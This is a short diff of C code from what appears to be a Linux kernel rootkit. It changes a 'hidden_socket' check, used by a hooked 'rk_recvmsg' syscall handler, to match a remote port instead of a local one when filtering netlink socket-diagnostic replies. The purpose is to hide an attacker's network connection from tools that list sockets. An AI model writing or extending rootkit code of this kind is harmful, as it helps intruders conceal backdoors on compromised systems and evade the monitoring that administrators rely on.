@@ -86,7 +86,7 @@ int hidden_socket(struct nlmsghdr *hdr)
 {
     struct inet_diag_msg *r = NLMSG_DATA(hdr);
 
-    return ntohs(r->id.idiag_dport) == LPORT;
+    return ntohs(r->id.idiag_dport) == RPORT;
 }
 
 asmlinkage long rk_recvmsg(const struct pt_regs *pt_regs)
